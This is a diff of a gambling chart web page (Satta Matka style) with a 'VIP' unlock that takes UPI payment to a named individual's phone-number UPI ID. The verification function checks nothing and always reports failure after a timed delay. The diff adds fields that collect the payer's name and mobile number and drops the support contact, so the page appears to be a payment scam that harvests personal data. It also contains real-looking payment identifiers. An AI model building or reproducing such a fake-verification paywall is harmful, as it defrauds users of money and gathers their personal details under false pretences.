@@ -22,32 +22,28 @@
         
         .scroll-btn { background: #65bbf5; color: var(--dark-blue); padding: 10px 20px; border: 4px solid #fff; border-radius: 15px; cursor: pointer; margin: 10px; font-size: 14px; font-weight: 700; display: inline-block; text-decoration: none; }
 
-        /* Chart Fix */
+        /* Chart Styles */
         #chartArea { background: #fff; width: 98%; margin: 10px auto; border: 1px solid var(--grid-border); }
         .chart-grid { display: grid; grid-template-columns: 50px repeat(6, 1fr); width: 100%; background: #fff; }
-        
         .day-label, .date-label { background: #000; color: var(--yellow-accent); font-weight: bold; font-size: 10px; padding: 10px 0; border: 0.5px solid var(--grid-border); }
-        
         .date-box { background: #f2f2f2; font-size: 9px; border: 0.5px solid var(--grid-border); display: flex; align-items: center; justify-content: center; font-weight: bold; height: 65px; color: #000; }
         .cell { position: relative; background: #fff; border: 0.5px solid var(--grid-border); display: flex; align-items: center; justify-content: center; height: 65px; box-sizing: border-box; }
-        
         .panna { display: flex; flex-direction: column; font-size: 9px; color: #555; position: absolute; line-height: 1.1; font-weight: bold; width: 12px; text-align: center; }
         .panna.left { left: 2px; } .panna.right { right: 2px; }
         .jodi { font-size: 20px; font-weight: bold; color: #000; }
         .red-house .jodi, .red-house .panna { color: var(--red) !important; }
-        
         .single-vip-lock { color: #f70031; font-size: 22px; animation: blink 1.5s infinite; }
         @keyframes blink { 50% { opacity: 0.4; } }
 
         /* Payment UI */
-        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 2000; align-items: center; justify-content: center; }
-        .modal-content { background: #fff; width: 85%; max-width: 380px; padding: 20px; border-radius: 20px; color: #333; }
+        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 2000; align-items: center; justify-content: center; overflow-y: auto; }
+        .modal-content { background: #fff; width: 85%; max-width: 380px; padding: 20px; border-radius: 20px; color: #333; margin: 20px 0; }
         .plan-box { border: 2px solid var(--dark-blue); margin: 10px 0; padding: 12px; border-radius: 10px; cursor: pointer; font-weight: bold; background: var(--yellow-accent); color: var(--dark-blue); }
         
         #timer { font-size: 22px; font-weight: bold; color: var(--red); margin: 10px 0; }
         .qr-img { width: 180px; height: 180px; margin: 10px auto; border: 4px solid var(--yellow-accent); }
-        input { width: 85%; padding: 12px; margin: 10px 0; border: 2px solid #ccc; border-radius: 8px; font-size: 16px; }
-        .verify-btn { background: #28a745; color: #fff; padding: 12px 30px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; width: 90%; }
+        input { width: 85%; padding: 10px; margin: 5px 0; border: 1.5px solid #ccc; border-radius: 8px; font-size: 14px; }
+        .verify-btn { background: #28a745; color: #fff; padding: 12px 30px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; width: 90%; margin-top: 10px; }
         
         .disclaimer { width: 90%; margin: 20px auto; padding: 15px; background: rgba(255,255,255,0.6); border-radius: 10px; font-size: 11px; color: #444; text-align: justify; border: 1px dashed var(--dark-blue); }
     </style>
@@ -79,7 +75,7 @@
 <button class="scroll-btn" onclick="window.scrollTo({top: 0, behavior: 'smooth'});">Go to Top</button>
 
 <div class="disclaimer">
-    <strong>DISCLAIMER:</strong> This website is for educational and informational purposes only. We do not promote gambling or any illegal activities. All data is based on historical patterns. Use this information at your own risk. We are not responsible for any financial loss or damage. 
+    <strong>DISCLAIMER:</strong> This website is for informational purposes only. Use of this data is at your own risk. We do not encourage illegal activities.
 </div>
 
 <div id="vipModal" class="overlay">
@@ -93,19 +89,25 @@
         </div>
 
         <div id="stepPay" style="display:none;">
-            <h3 id="payTitle"></h3>
+            <h3 id="payTitle" style="margin-bottom:5px;"></h3>
             <div id="timer">02:00</div>
-            <p style="margin:2px;"><strong>Omkar Yadav</strong></p>
+            <p style="margin:2px; font-size:14px;"><strong>Payment Name: Omkar Yadav</strong></p>
             <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=8103982813@ptsbi%26pn=Omkar%20Yadav%26cu=INR" class="qr-img">
-            <input type="number" id="utrInput" placeholder="Enter 12 Digit UTR No.">
+            
+            <input type="text" id="userName" placeholder="अपना नाम लिखें">
+            <input type="number" id="userPhone" placeholder="अपना मोबाइल नंबर">
+            <input type="number" id="utrInput" placeholder="12 Digit UTR No. दर्ज करें">
+            
             <button class="verify-btn" onclick="startVerification()">VERIFY PAYMENT</button>
         </div>
 
         <div id="stepFailed" style="display:none;">
-            <h2 style="font-size:40px; color:red;">⚠️</h2>
+            <h2 style="font-size:40px; color:red; margin: 10px 0;">⚠️</h2>
             <h3 style="color:red;">Verification Failed!</h3>
-            <p>पेमेंट वेरिफाई नहीं हुआ। हेल्प के लिए संपर्क करें।</p>
-            <button class="scroll-btn" onclick="sendToWhatsapp()" style="background:#25D366; color:white; border:none;">WHATSAPP SUPPORT</button>
+            <p style="padding: 0 10px;">आपका पेमेंट वेरिफाई नहीं हो पाया है। कृपया सही UTR नंबर डालें या हेल्प डेस्क से संपर्क करें।</p>
+            <button class="scroll-btn" onclick="resetSteps()" style="background:#4fb5f5; color:white; border:none;">TRY AGAIN</button>
+            <br><br>
+            <button onclick="closeVipModal()" style="color:gray; background:none; border:none; cursor:pointer;">CLOSE</button>
         </div>
     </div>
 </div>
@@ -113,7 +115,6 @@
 <script>
     let timeLeft = 120;
     let timerId = null;
-    let selectedAmount = 0;
 
     function openVipModal() { document.getElementById('vipModal').style.display = 'flex'; resetSteps(); }
     function closeVipModal() { document.getElementById('vipModal').style.display = 'none'; clearInterval(timerId); }
@@ -122,13 +123,13 @@
         document.getElementById('stepPlan').style.display = 'block';
         document.getElementById('stepPay').style.display = 'none';
         document.getElementById('stepFailed').style.display = 'none';
+        clearInterval(timerId);
     }
 
     function showPayment(amt, plan) {
-        selectedAmount = amt;
         document.getElementById('stepPlan').style.display = 'none';
         document.getElementById('stepPay').style.display = 'block';
-        document.getElementById('payTitle').innerText = plan + " VIP";
+        document.getElementById('payTitle').innerText = plan + " VIP - ₹" + amt;
         startTimer();
     }
 
@@ -145,9 +146,16 @@
     }
 
     function startVerification() {
+        let name = document.getElementById('userName').value;
+        let phone = document.getElementById('userPhone').value;
         let utr = document.getElementById('utrInput').value;
-        if(utr.length < 10) { alert("Enter 12 Digit UTR No."); return; }
-        document.querySelector('.verify-btn').innerText = "Verifying...";
+        
+        if(!name || phone.length < 10 || utr.length < 10) { 
+            alert("कृपया नाम, सही मोबाइल नंबर और UTR नंबर भरें।"); 
+            return; 
+        }
+        
+        document.querySelector('.verify-btn').innerText = "Processing...";
         setTimeout(showFailed, 3000);
     }
 
@@ -157,17 +165,11 @@
         clearInterval(timerId);
     }
 
-    function sendToWhatsapp() {
-        let utr = document.getElementById('utrInput').value;
-        let msg = `Bhai maine ₹${selectedAmount} pay kiya hai. UTR: ${utr}. Mera VIP chart open kardo.`;
-        window.open(`https://wa.me/918103982813?text=${encodeURIComponent(msg)}`, '_blank');
-    }
-
     const CSV_URL = "https://docs.google.com/spreadsheets/d/1IReRyQjRvWWVjZTym_8DDXvx9Jttjfgy18McY53gM5w/export?format=csv";
 
     async function loadChart() {
         try {
-            const res = await fetch(CSV_URL + "&cache=" + new Date().getTime());
+            const res = await fetch(CSV_URL + "&t=" + new Date().getTime());
             const data = await res.text();
             const rows = data.split('\n').map(r => r.split(','));
             let h = ''; let lockPlaced = false;
@@ -175,28 +177,20 @@
             for(let i=1; i<rows.length; i++) {
                 let dateStr = (rows[i][0]||"").trim().replace(/"/g,"");
                 if(!dateStr) continue;
-                
                 h += `<div class="date-box">${dateStr}</div>`;
-                
                 for(let j=1; j<=16; j+=3) {
                     let l = (rows[i][j]||"").trim().replace(/"/g,"");
                     let jo = (rows[i][j+1]||"").trim().replace(/"/g,"");
                     let r = (rows[i][j+2]||"").trim().replace(/"/g,"");
-
                     if(!l && !jo && !r) {
-                        if(!lockPlaced) { 
-                            h += `<div class="cell"><div class="single-vip-lock">🔒</div></div>`; 
-                            lockPlaced = true; 
-                        } else { 
-                            h += `<div class="cell"></div>`; 
-                        }
+                        if(!lockPlaced) { h += `<div class="cell"><div class="single-vip-lock">🔒</div></div>`; lockPlaced = true; }
+                        else { h += `<div class="cell"></div>`; }
                     } else {
                         let isRed = false;
                         if(jo.length >= 2) {
                             if(jo[0] === jo[1] || Math.abs(parseInt(jo[0]) - parseInt(jo[1])) === 5) isRed = true;
                         }
                         if(jo.includes('*')) isRed = true;
-                        
                         let lh = l.split('').map(s => `<span>${s}</span>`).join('');
                         let rh = r.split('').map(s => `<span>${s}</span>`).join('');
                         h += `<div class="cell ${isRed ? 'red-house' : ''}">
@@ -208,9 +202,7 @@
                 }
             }
             document.getElementById('gridData').innerHTML = h;
-        } catch(e) { 
-            document.getElementById('gridData').innerHTML = "<div style='grid-column: span 7; padding:20px;'>Data Load Failed</div>"; 
-        }
+        } catch(e) { document.getElementById('gridData').innerHTML = "Loading Error"; }
     }
     loadChart();
 </script>
